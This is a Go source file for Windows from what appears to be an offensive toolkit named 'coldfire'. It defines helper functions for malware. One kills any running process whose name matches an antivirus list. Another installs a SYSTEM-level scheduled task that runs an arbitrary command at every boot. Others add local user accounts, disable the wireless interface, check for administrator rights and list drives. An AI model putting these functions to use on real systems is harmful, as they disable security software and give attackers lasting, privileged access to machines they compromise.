//go:build windows
// +build windows

package coldfire

import (
	"fmt"
	"frostbite.com/coldfire/models"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"os"
)

func killProcByPID(pid int) error {
	kernel32dll := windows.NewLazyDLL("Kernel32.dll")
	OpenProcess := kernel32dll.NewProc("OpenProcess")
	TerminateProcess := kernel32dll.NewProc("TerminateProcess")
	op, _, _ := OpenProcess.Call(0x0001, 1, uintptr(pid))
	//protip:too much error handling can screw things up
	_, _, err2 := TerminateProcess.Call(op, 9)
	return err2
}

func isRoot() bool {
	root := true

	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		root = false
	}

	return root
}

func info() string {
	user, err := cmdOut("query user")
	if err != nil {
		user = "N/A"
	}

	// o, err := cmdOut("ipconfig")
	// if err != nil {
	// 	ap_ip = "N/A" // (1)
	// }

	// entries := strings.Split(o, "\n")

	// for e := range entries {
	// 	entry := entries[e]
	// 	if strings.Contains(entry, "Default") {
	// 		ap_ip = strings.Split(entry, ":")[1] // (1)
	// 	}
	// }

	return user
}

func pkillAv() error {
	av_processes := models.AvProc

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func wifiDisconnect() error {
	cmd := `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func addPersistentCommand(cmd string) error {
	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	return err
}

func CreateUser(username, password string) error {
	cmd := f("net user %s %s /ADD", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			found_drives = append(found_drives, string(drive)+":\\")
			f.Close()
		}
	}
	return found_drives, nil
}
